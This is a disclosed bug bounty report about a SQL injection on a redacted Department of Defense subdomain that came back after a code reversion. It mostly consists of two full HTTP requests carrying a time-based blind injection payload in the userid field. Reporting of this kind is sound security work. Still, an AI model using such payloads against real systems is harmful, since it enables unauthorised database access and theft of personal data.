# Code reversion allowing SQLI again in ███████

## Report Details
- **Report ID**: 348047
- **URL**: https://hackerone.com/reports/348047
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-05-07T00:00:45.335Z
- **Disclosed**: 2019-10-08T18:49:20.686Z

## Reporter
- **Username**: alyssa_herrera
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
I just noticed that my publicly disclosed report, https://hackerone.com/reports/311922 is sstill vulnerable either a code reversion was made or something was done to revert the patch. Additionally I'd please request that the images in the report to be censored or redacted as it's been made vulnerable again.
**Description:**
A code reversion made a previously patched sql injection vulnerable, allowing attackers to once again attack and access the back end DB. 
## Impact
High
## Step-by-step Reproduction Instructions

POST /elist/email_aba.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1

lname=S&userid=admin'%2b(select*from(select(sleep(3)))a)%2b'&pw=admin

vs 

POST /elist/email_aba.php HTTP/1.1
Host: █████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://████████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1

lname=S&userid=admin'%2b(select*from(select(sleep(0)))a)%2b'&pw=admin

## Product, Version, and Configuration (If applicable)
N/a
## Suggested Mitigation/Remediation Actions
Take down subdomain if not needed any more

## Impact

Access database information, steal sensitive PII or information

The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Verified**
Yes

**What exploitation technique did you utilize?**
Time delay

**Please describe the results of your verification attempt.**
Observed time delays when using sleep comands



## Attachments
No attachments
